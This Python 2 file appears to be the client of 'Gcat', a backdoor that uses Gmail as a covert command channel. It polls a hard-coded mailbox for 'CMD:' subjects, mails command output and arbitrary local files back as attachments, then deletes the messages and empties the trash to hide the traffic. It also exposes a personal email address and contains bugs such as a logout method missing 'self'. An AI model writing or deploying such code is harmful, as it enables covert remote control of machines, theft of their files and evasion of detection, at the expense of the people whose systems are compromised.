import email
import imaplib
import sys
import string
import os
import json
import uuid

from datetime import datetime
from smtplib import SMTP
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email import Encoders

#######################################
gmail_user = 'leandro.mantovani93@gmail.com'
gmail_pwd = os.environ['pw_mail']
server = "smtp.gmail.com"
server_port = 587
#######################################



class msgparser:
    def __init__(self, msg_data):
        self.attachment = None
        self.getPayloads(msg_data)
        self.getSubjectHeader(msg_data)
        self.getDateHeader(msg_data)
        self.getMessageId(msg_data)

    def getPayloads(self, msg_data):
        for payload in email.message_from_string(msg_data[1][0][1]).get_payload():
            if payload.get_content_maintype() == 'text':
                self.text = payload.get_payload()

            elif payload.get_content_maintype() == 'application':
                self.attachment = payload.get_payload()

    def getSubjectHeader(self, msg_data):
        self.subject = email.message_from_string(msg_data[1][0][1])['Subject']

    def getDateHeader(self, msg_data):
        self.date = email.message_from_string(msg_data[1][0][1])['Date']

    def getMessageId(self, msg_data):
        self.msg_no = msg_data[1][0][0].split()[2]

class Gcat:

    def __init__(self):
        self.c = imaplib.IMAP4_SSL(server)
        self.c.login(gmail_user, gmail_pwd)
        self.pending_tasks = []

    def sendEmail(self, output, task_id, attachment=[]):

        for task in self.pending_tasks:
            if task['task_id'] == task_id: 

                sub_header = 'GluGlu: return of {}'.format(task['cmd'])

                msg = MIMEMultipart()
                msg['From'] = sub_header
                msg['To'] = gmail_user
                msg['Subject'] = sub_header
                
                aux = {
                    'enviroment': {
                        'cmd_id': task['task_id'],
                        'cmd': task['cmd']
                    },
                    'output': {
                        'output': output
                    }
                }

                msgtext = json.dumps(aux)
                msg.attach(MIMEText(str(msgtext)))
                
                for attach in attachment:
                    if os.path.exists(attach) == True:  
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(open(attach, 'rb').read())
                        Encoders.encode_base64(part)
                        part.add_header('Content-Disposition', 'attachment; filename="{}"'.format(os.path.basename(attach)))
                        msg.attach(part)

                mailServer = SMTP()
                mailServer.connect(server, server_port)
                mailServer.starttls()
                mailServer.login(gmail_user,gmail_pwd)
                mailServer.sendmail(gmail_user, gmail_user, msg.as_string())
                mailServer.quit()

                print "[*] Command sent successfully"

            else:
                sys.exit("[-] You must receive a command before return an output")

    def delete_pending_task(self, task_id):
        for task in self.pending_tasks:
            if task_id == task['task_id']:
                self.c.store(task['msg_no'], '+FLAGS', '\\Deleted')
                self.pending_tasks.remove(task)

        self.c.select('[Gmail]/Papelera')
        self.c.store("1:*", '+FLAGS', '\\Deleted')
        self.c.expunge()


    def checkCommands(self):
        self.c.select()
        rcode, idlist = self.c.uid('search', None, "(SUBJECT 'CMD:')")

        for idn in idlist[0].split():
            msg_data = self.c.uid('fetch', idn, '(RFC822)')
            msg = msgparser(msg_data)

            try:
                current_cmdid = str(uuid.uuid4())

                flag = False
                for task in self.pending_tasks: 
                    if current_cmdid == task['task_id']: flag = True

                if not flag:
                    self.pending_tasks.append({
                    'task_id': current_cmdid,
                    'cmd': msg.subject.split(':')[1],
                    'msg_no': msg.msg_no
                })
            except ValueError:
                pass


    def logout():
        self.c.logout()


